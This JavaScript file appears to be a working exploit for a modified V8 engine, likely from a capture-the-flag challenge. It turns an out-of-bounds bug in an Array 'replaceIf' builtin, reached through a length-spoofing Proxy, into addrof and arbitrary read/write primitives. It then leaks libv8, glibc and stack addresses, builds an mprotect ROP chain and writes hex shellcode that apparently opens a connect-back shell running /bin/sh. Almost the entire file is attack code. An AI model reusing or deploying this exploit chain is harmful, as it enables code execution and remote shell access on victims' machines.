function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

let arr1 = new Array(10);
arr1.fill(1.2);

let victim_obj = { marker: 0x41424344, obj: {}};

let victim_buf = new ArrayBuffer(0x123);

let fproxy = new Proxy(arr1, {
    get: function(obj, prop) {
        if (prop == 'length')
            return 0xffffffff;
        return obj[prop];
    }
});

function readOOB(arr, idx) {
    x = 0;
    arr.replaceIf(idx, (d) => {
        x = d;
        return false;
    }, -1);
    return Int64.fromDouble(x);
}

function writeOOB(arr, idx, val) {
    arr.replaceIf(idx, (d) => {
//        readline();
        return true;
    }, val);
}

function addrof(obj) {
    victim_obj.obj = obj;
    for (var i = 0; i < 500; i++) {
        val = readOOB(fproxy, i);
        if (val == 0x4142434400000000) {
            return readOOB(fproxy, i + 1);
        }
    }
    return -1;
}

victim_idx = -1;
for (var i = 0; i < 500; i++) {
    val = readOOB(fproxy, i);
    if (val == 0x0000012300000000) {
        victim_idx = i + 1;
        console.log("FOUND victim_idx");
        break;
    }
}


function readme(addr, size) {
//    backing_ptr = readOOB(fproxy, victim_idx);
    writeOOB(fproxy, victim_idx, addr.asDouble());
    let a = new Uint8Array(victim_buf, 0, size);
  //  writeOOB(fproxy, victim_idx, backing_ptr);
    return Array.from(a);
}

function writeme(addr, value){
   // backing_ptr = readOOB(fproxy, victim_idx - 1);
    writeOOB(fproxy, victim_idx, addr.asDouble());
    let a = new Uint8Array(victim_buf);
    a.set(value);
    //writeOOB(fproxy, victim_idx, backing_ptr);
}

var dummy = Array;
//%DebugPrint(dummy);

dummy_addr = Sub(addrof(dummy), 1);
console.log("dummy @ " + dummy_addr);

ArrayCode = Sub(new Int64(readme(Add(dummy_addr, 8 * 6), 8)), 1);
console.log("ArrayCode @ " + ArrayCode);

ArrayConstructor = new Int64(readme(Add(ArrayCode, 0x42), 6).concat([0, 0]));
console.log("ArrayConstructor @ " + ArrayConstructor);

libv8_base = Sub(ArrayConstructor, 0x4050ca0);
console.log("libv8_base @ " + libv8_base);

fgets_got = Add(libv8_base, 0x8d81ae8);
fgets_addr = new Int64(readme(fgets_got, 8));
console.log("fgets @ " + fgets_addr);

glibc_base = Sub(fgets_addr, 0x7eb20);
console.log("glibc_base @ " + glibc_base);

environ = Add(glibc_base, 0x3ee098);
console.log("environ @ " + environ);

stack_leak = new Int64(readme(environ, 8));
stack_base = new Int64([0, 0].concat(stack_leak.bytes().slice(2, 8)));
console.log("stack_leak @ " + stack_leak);
console.log("stack_base @ " + stack_base);

overwrite = Sub(stack_leak, 0x2f88);
console.log("overwrite @ " + overwrite);

//for (var i = 0; i <= 50; i++) {
//    overwrite1 = Add(overwrite, 8 * i);
    before = new Int64(readme(overwrite, 8));
    console.log("before = " + i + " " + before);
//}

var rops = {
    'poprdi': 0x2155f,
    'poprsi': 0x23e6a,
    'poprdx': 0x1b96,
    'mprotect': 0x11bae0,
}

for (var k in rops) {
    rops[k] = Add(glibc_base, rops[k]);
}

shellcode = new Array(0x40);
shellcode.fill(0x90);
shellcode = unhexlify("6a29586a025f6a015e990f054889c548b801010101010101025048b8030104387e010103483104246a2a584889ef6a105a4889e60f056a035e48ffce780b566a21584889ef0f05ebef6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05");

//overwrite = Sub(stack_leak, 8 * 32);
ret = [];
//ret = unhexlify("4141414141410000");
ret = ret.concat(rops['poprdi'].bytes());
ret = ret.concat(stack_base.bytes());
ret = ret.concat(rops['poprsi'].bytes());
ret = ret.concat((new Int64(0x1000)).bytes());
ret = ret.concat(rops['poprdx'].bytes());
ret = ret.concat((new Int64(7)).bytes());
//ret = ret.concat(unhexlify("4141414141410000"));
ret = ret.concat(rops['mprotect'].bytes());
ret = ret.concat(stack_base.bytes());

writeme(stack_base, shellcode);
//for (var i = 0; i <= 500; i ++) {
//    overwrite1 = Add(overwrite, 8 * i);
//    writeme(overwrite1, ret);
//}

//for (var i = 50; i <= 50; i++) {
//    overwrite1 = Add(overwrite, 8 * i);
//    writeme(overwrite1, ret);
//}

//for (var i = 50; i <= 50; i++) {
//    overwrite1 = Add(overwrite, 8 * i);
//    before = new Int64(readme(overwrite1, 8));
//    console.log("after = " + i + " " + before);
//}

//before = new Int64(readme(overwrite, 8));
//console.log("after = " + before);
//for (var i = 0; i < 100; i++) {
//    console.log("slow");
//}


var i = 0;
while (true) {
    i ++;
    if (i >= 500000000) {
        break;
    }
}

// This return address is only writeable after the big loop above is called. maybe JIT?
writeme(overwrite, ret);
